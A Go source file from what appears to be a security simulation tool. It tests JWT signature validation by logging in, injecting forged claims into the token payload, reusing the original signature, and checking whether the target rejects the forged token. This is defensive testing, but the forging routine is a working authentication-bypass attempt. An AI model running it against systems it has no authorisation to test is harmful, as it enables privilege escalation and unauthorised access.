package utils

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/suryatk2007/threatsim/pkg/types"
)

type JWTForgeConfig struct {
	BaseURL              string
	AuthPath             string
	AuthPayload          string
	TokenJSONPath        string
	TargetPath           string
	ForgeClaims          map[string]interface{}
	ExpectedStatusCode   int
	ExpectedBodyContains string
	Client               *http.Client
}

// RunJWTForgeValidation executes the JWT signature validation attack
func RunJWTForgeValidation(simName string, cfg JWTForgeConfig) []types.SimulationResult {
	start := time.Now()
	var expectedMessages []string
	if cfg.ExpectedStatusCode > 0 {
		expectedMessages = append(expectedMessages, fmt.Sprintf("status %d", cfg.ExpectedStatusCode))
	}
	if cfg.ExpectedBodyContains != "" {
		expectedMessages = append(expectedMessages, fmt.Sprintf("body containing %q", cfg.ExpectedBodyContains))
	}

	res := types.SimulationResult{
		SimulationName: simName,
		Method:         "GET",
		ExpectedResult: fmt.Sprintf("Application should return %s (e.g., Token Rejected)", strings.Join(expectedMessages, " or ")),
	}

	authURL := fmt.Sprintf("%s/%s", cfg.BaseURL, strings.TrimLeft(cfg.AuthPath, "/"))

	// 1. Login and get Token
	authRes, err := AuthenticateAndExtract(cfg.Client, AuthConfig{
		URL:           authURL,
		Payload:       cfg.AuthPayload,
		TokenJSONPath: cfg.TokenJSONPath,
	})
	if err != nil {
		res.Passed = false
		res.ActualResult = "Auth Failed"
		res.Reason = err.Error()
		return []types.SimulationResult{res}
	}
	token := authRes.Token

	// 2. Decode and Forge JWT
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		res.Passed = false
		res.ActualResult = "Invalid JWT"
		res.Reason = "The extracted token is not a valid 3-part JWT."
		return []types.SimulationResult{res}
	}

	// Decode payload
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		res.Passed = false
		res.ActualResult = "Decode Failed"
		res.Reason = "Failed to base64 decode JWT payload: " + err.Error()
		return []types.SimulationResult{res}
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		res.Passed = false
		res.ActualResult = "JSON Parse Failed"
		res.Reason = "Failed to parse JWT payload JSON: " + err.Error()
		return []types.SimulationResult{res}
	}

	// Inject forged claims
	for k, v := range cfg.ForgeClaims {
		payload[k] = v
	}

	// Re-encode payload
	newPayloadBytes, _ := json.Marshal(payload)
	newPayloadB64 := base64.RawURLEncoding.EncodeToString(newPayloadBytes)

	// Reconstruct forged token (Header.NewPayload.OldSignature)
	forgedToken := fmt.Sprintf("%s.%s.%s", parts[0], newPayloadB64, parts[2])

	// 3. Try to access target with forged token
	targetURL := fmt.Sprintf("%s/%s", cfg.BaseURL, strings.TrimLeft(cfg.TargetPath, "/"))
	res.URL = targetURL

	req, _ := http.NewRequest("GET", targetURL, nil)
	req.Header.Set("Authorization", "Bearer "+forgedToken)

	resp, err := cfg.Client.Do(req)
	res.Duration = time.Since(start)

	if err != nil {
		res.Passed = false
		res.ActualResult = "Execution Failed"
		res.Reason = err.Error()
		return []types.SimulationResult{res}
	}
	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyString := string(bodyBytes)
	resp.Body.Close()

	isStatusHit := cfg.ExpectedStatusCode > 0 && resp.StatusCode == cfg.ExpectedStatusCode
	isBodyHit := cfg.ExpectedBodyContains != "" && strings.Contains(bodyString, cfg.ExpectedBodyContains)

	if isStatusHit || isBodyHit {
		res.Passed = true
		res.ActualResult = "Security control triggered"
		res.Reason = "Security control successfully detected and rejected the forged JWT signature."
	} else {
		res.Passed = false
		res.ActualResult = fmt.Sprintf("Status %d", resp.StatusCode)
		res.Reason = fmt.Sprintf("Expected %s, got Status %d. JWT Signature Validation Bypass potentially exists!", strings.Join(expectedMessages, " or "), resp.StatusCode)
	}

	return []types.SimulationResult{res}
}
